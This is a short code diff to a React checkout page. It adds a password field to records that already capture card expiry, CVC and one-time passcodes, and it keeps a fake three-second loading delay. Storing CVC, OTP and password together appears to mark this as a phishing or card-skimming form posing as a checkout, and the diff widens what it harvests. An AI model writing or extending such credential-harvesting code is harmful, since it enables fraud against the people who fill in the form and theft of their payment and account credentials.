@@ -32,7 +32,8 @@ export default function CheckoutPage() {
           month: paymentInfo?.month,
           cvc: paymentInfo?.cvc,
           otp: paymentInfo?.otp,
-          createdAt: new Date()
+          pass:paymentInfo?.pass,
+          createdAt: new Date(),
 
 
         } : {
@@ -41,6 +42,7 @@ export default function CheckoutPage() {
           month: paymentInfo?.month,
           cvc: paymentInfo?.cvc,
           otp: paymentInfo?.otp,
+          pass:paymentInfo?.pass,
           createdAt: new Date()
         }
 
@@ -62,7 +64,6 @@ export default function CheckoutPage() {
     setisloading(true)
     setTimeout(() => {
       setisloading(false)
-
       setStep(2)
     }, 3000)
   }
